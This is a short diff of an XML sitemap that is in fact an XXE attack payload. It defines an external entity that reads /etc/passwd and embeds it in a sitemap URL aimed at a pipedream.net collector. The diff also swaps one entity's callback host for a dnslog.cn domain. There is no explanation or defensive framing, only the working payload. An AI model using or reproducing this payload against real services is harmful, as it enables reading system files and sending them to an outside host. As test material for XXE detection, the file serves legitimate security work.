@@ -4,7 +4,7 @@
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
   <!ENTITY xxe2 SYSTEM "aaa" >
   <!ENTITY xxe3 "bbb" >
-  <!ENTITY xxe4 "https://enhh3uyuwb6v9lz.m.pipedream.net/ccc" >]>
+  <!ENTITY xxe4 "https://githubxml.tcf29m.dnslog.cn/ccc" >]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
   <url>
     <loc>https://enhh3uyuwb6v9lz.m.pipedream.net/&xxe;</loc>
